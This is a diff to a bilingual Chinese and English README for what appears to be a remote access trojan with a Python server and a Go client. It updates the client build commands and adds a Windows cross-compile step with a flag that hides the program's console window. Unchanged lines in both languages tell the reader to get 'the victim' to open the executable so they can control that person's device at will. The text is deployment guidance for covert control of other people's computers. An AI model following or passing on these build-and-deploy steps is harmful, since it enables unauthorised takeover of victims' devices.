@@ -47,15 +47,18 @@ python server.py
 (server)>
 ```
 
-最后编译`client.go`
+最后编译客户端。从v3.0开始，客户端代码已重构为多文件结构，位于`code/client/`目录下：
 ```bash
-go build -o <output_filename> client.go
+cd code/client
+go build -o <output_filename> .
 ```
 
 如果想要一个在Windows系统上隐藏黑窗的客户端，可以运行：
 ```bash
-go build -ldflags "-H windowsgui" -o <output_filename> client.go
+GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui" -o <output_filename>.exe .
 ```
+
+- 客户端现在会显示版本号在系统信息中
 
 让受害者打开编译后的可执行文件，如果配置正确且权限允许，你将可以随心所欲地控制他的设备
 
@@ -108,15 +111,18 @@ Reference running result:
 (server)>
 ```
 
-Finally, compile `client.go`:
+Finally, compile the client. Starting from v3.0, the client code has been refactored into a multi-file structure located in the `code/client/` directory:
 ```bash
-go build -o <output_filename> client.go
+cd code/client
+go build -o <output_filename> .
 ```
 
 If you want a client that hides the black window in Windows, you can run:
 ```bash
-go build -ldflags "-H windowsgui" -o <output_filename> client.go
+GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui" -o <output_filename>.exe .
 ```
+
+- The client now displays the version number in system information
 
 Have the victim open the compiled executable file. If the configuration is correct and permissions are granted, you will be able to control their device as you wish.
 
